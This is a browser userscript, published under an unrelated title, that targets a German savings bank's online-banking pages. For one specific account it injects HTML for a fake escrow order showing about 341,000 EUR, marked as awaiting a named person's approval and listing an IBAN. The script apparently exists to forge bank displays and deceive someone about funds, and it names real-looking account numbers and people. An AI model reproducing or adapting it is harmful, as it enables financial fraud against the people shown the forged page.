// ==UserScript==
// @name         Vertragssignature Andreas Acker
...
// @match        https://www.dspk-mecklenburg-nordwest.de/de/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.dspk-mecklenburg-nordwest.de/de/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.dspk-mecklenburg-nordwest.de/de/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/462755/Vertragssignature%20Andreas%20Acker.user.js
// @updateURL https://update.greasyfork.org/scripts/462755/Vertragssignature%20Andreas%20Acker.meta.js
// ==/UserScript==
...
(function() {
    ...
    if (window.location.href.indexOf("umsaetze") > 0) {
        ...
        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == "1506 4703 90" ){
            var xHTML = '<div class="mkp-card-list"><span class="mkp-list-subline">Spezialauftrag Treuhand (1)</span><ul class="mkp-card-group mkp-group-unify mkp-group-clickable" aria-label="Treuhand"><li aria-label="Treuhand Auftrag"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Jorg Stoermer: Treuhand Freigabe nötig durch Jorg Stoermer">Treuhand: Freigabe nötig durch Jorg Stoermer</a></h3><p>Treuhand-Auftrag: DE33300209003733131975</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">341.278</span><span aria-hidden="true" class="balance-decimal plus">,23&nbsp;EUR</span><span aria-hidden="false" class="offscreen">-100,00 EUR</span></div></div></div></div></li></ul></div>';
